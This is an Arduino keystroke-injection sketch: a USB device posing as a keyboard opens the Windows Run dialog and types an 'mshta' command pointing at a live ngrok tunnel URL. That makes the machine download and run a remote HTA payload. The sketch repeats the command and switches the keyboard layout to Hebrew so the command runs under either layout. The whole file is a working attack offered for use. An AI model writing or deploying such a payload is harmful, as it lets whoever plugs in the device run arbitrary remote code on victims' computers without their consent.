#include <Keyboard.h>

// Define IP address
const char* ip = "http://2.tcp.eu.ngrok.io:13505/PJeHQ";

void setup() {
  Keyboard.begin(); // Initialize Keyboard library
  delay(2000); // Wait for 2 seconds for system initialization

  // Step 1: Opens the Run dialog on Windows (Win + r)
  Keyboard.press(KEY_LEFT_GUI); // Press Windows key (Win)
  Keyboard.press('r'); // Press 'r' key
  delay(100);
  Keyboard.releaseAll(); // Release all keys

  delay(500);

  // Step 2: Types "mshta <ip>" in the Run dialog
  Keyboard.print("mshta ");
  Keyboard.print(ip);

  // Step 3: Switches the keyboard language to Hebrew (example)
  switchToHebrew();

  // Step 4: Types " && mshta <ip>" in Hebrew
  Keyboard.print(" && mshta ");
  Keyboard.print(ip);

  // Step 5: Presses Enter to execute the command
  pressKey(KEY_RETURN);

  // Step 6: Presses Enter again to execute the command
  pressKey(KEY_RETURN);

  // Step 7: Types "mshta <ip>" in English again
  Keyboard.print("mshta ");
  Keyboard.print(ip);

  // Step 8: Presses Enter again to execute the command
  pressKey(KEY_RETURN);

  // End of actions
  while (true) {
    // Optional: Loop to keep the microcontroller active, if needed
  }
}

void loop() {
  // Empty loop
}

// Function to switch keyboard language to Hebrew (example)
void switchToHebrew() {
  // Example: Press ALT + SHIFT to switch to Hebrew layout
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_LEFT_SHIFT);
  delay(100);
  Keyboard.release(KEY_LEFT_SHIFT); // Release SHIFT key while ALT is still pressed
  Keyboard.release(KEY_LEFT_ALT); // Release ALT key
}

// Function to press a single key
void pressKey(uint8_t key) {
  Keyboard.press(key);
  delay(100);
  Keyboard.releaseAll(); // Release all keys
}
